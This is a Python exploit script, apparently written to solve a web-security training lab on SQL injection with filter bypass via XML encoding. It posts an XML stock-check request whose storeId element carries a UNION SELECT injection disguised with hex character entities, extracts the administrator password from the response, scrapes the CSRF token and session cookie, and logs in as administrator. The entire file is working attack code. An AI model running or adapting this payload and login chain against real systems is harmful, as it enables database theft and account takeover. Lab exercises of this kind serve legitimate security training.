"""
  Lab: SQL injection with filter bypass via XML encoding

  Steps:
  1. Inject payload into storeId XML element to retrieve administrator password using UNION-based attack
  2. Extract administrator password from the response body
  3. Fetch the login page
  4. Extract the csrf token and session cookie
  5. Login as the administrator
  6. Fetch the administrator profile

  Author: N00BCYB0T
"""
import argparse
import requests
from colorama import Fore
import re
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help='Target URL')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    # Configure session with proxy if provided
    session = requests.session()
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        session.proxies = proxies
    session.verify = False

    print("⦗#⦘ Injection parameter: " + Fore.YELLOW + "storeId")
    print(Fore.WHITE + "⦗1⦘ Injecting payload to retrieve administrator password using UNION-based attack.. ", end="", flush=True)

    payload = """<?xml version="1.0" encoding="UTF-8"?>
                <stockCheck>
                    <productId>
                        3 
                    </productId>
                    <storeId>
                        1 &#x55;NION &#x53;ELECT password FROM users WHERE username = &#x27;administrator&#x27;
                    </storeId>
                </stockCheck>"""

    headers = { "Content-Type": "application/xml" }
    injection = post_data("/product/stock", payload, session, args.url, headers=headers)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting administrator password from the response.. ", end="", flush=True)

    # If the pattern not work, change it to "(.*)\n",
    # It depends on how the password is retrieved, after the the number of units or before them, and the two scenarios occur
    admin_password = re.findall("\n(.*)", injection.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_password)
    print(Fore.WHITE + "⦗3⦘ Fetching the login page.. ", end="", flush=True)

    login_page = fetch("/login", session, args.url)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Extracting the csrf token and session cookie.. ", end="", flush=True)
    
    session_cookie = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Logging in as the administrator.. ", end="", flush=True)

    data = { "username": "administrator", "password": admin_password, "csrf": csrf_token }
    cookies = { "session": session_cookie }
    admin_login = post_data("/login", data, session, args.url, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗6⦘ Fetching the administrator profile.. ", end="", flush=True)

    admin_session = admin_login.cookies.get("session")
    cookies = { "session": admin_session }
    fetch("/my-account", session, args.url, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, session, url, cookies = None):
    try:  
        return session.get(f"{url}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, session, url, cookies = None, headers = None):
    try:    
        return session.post(f"{url}{path}", data, cookies=cookies, headers=headers, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()